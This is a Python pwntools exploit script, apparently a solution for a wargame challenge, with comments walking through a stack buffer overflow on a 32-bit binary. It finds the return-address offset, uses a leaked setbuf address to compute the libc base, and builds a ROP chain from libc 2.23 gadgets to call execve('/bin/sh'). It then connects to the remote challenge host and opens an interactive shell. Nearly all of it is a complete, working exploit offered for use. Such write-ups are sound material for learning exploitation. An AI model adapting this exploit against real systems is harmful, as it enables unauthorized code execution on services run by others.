#!/usr/bin/env python3
from pwn import *

# Before creating the script:

# If we run the program in gdb, and pass in a cyclic sequence of length 10,000, it 
# displays 'Invalid address 0x61696d61'. Using cyclic -l '0x61696d61',
# we determine this is at offset 1230. Hence, this is the offset of the return address.

# To determine the base of libc, we can use the leaked libc address that the program
# displays when starting up. In binary ninja, we can see the program is simply 
# printing the address of setbuf at this point. We also note that the libc file used 
# was given to us in the wargames, being version 2.23. Hence, executing the command
# readelf -s challenges/libc-2.23.so | grep ' setbuf' reveals the offset of setbuf
# is 00065ff0, so we simply subtract this from our leak to get the base.

# Given this, we can now use any gadgets found in libc, and simply add the offsets
# for these to the libc base. Using these, we want to create a ROP chain that does
# execve("/bin/sh", NULL, NULL). Using shellcode, we would do:
'''
mov eax, 11
mov ebx, "/bin/sh"
xor ecx, ecx
xor edx, edx
int 0x80
''' 

# Using ropper, we can find these gadgets and chain them together in our payload.
# If we finally send this payload such that it overwrites the return address, we
# will pop a shell and be able to access the flag.

# The script:
p = remote("plsdonthaq.me", 6003)

# First we need to extract the leaked libc address.
p.recvuntil("- ")
libc_leak = int(p.recv(10), 0)

# Given this, we find the offset of setbuf in libc (which is what was being printed),
# and subtract it from this leak to get the base of libc.
libc_base = libc_leak - 0x00065ff0

# Now using ropper we are able to find gadgets to use in our payload, adding the
# offsets given to the libc base.
xor_eax_eax = libc_base + 0x0002c79c
inc_eax = libc_base + 0x00024b41
pop_ebx = libc_base + 0x00089293
bin_sh = libc_base + 0x0015ba0b
pop_ecx_edx = libc_base + 0x0002bc6c
int_80 = libc_base + 0x00002c87

# Our payload then consists of these gadgets chained together to pop a shell.
payload = (
    p32(xor_eax_eax) + # xor eax, eax; ret;
    p32(inc_eax)*11 + # inc eax; ret;
    p32(pop_ebx) + # pop ebx; ret
    p32(bin_sh) + # /bin/sh that pops into ebx
    p32(pop_ecx_edx) + # pop ecx; pop edx; ret;
	p32(0) +
	p32(0) +
    p32(int_80) # int 0x80;
)

# We then send this payload at the offset of the return address.
p.sendline(flat({
 1230: payload
}))

# Given we now have shell, we can access the flag.
p.interactive()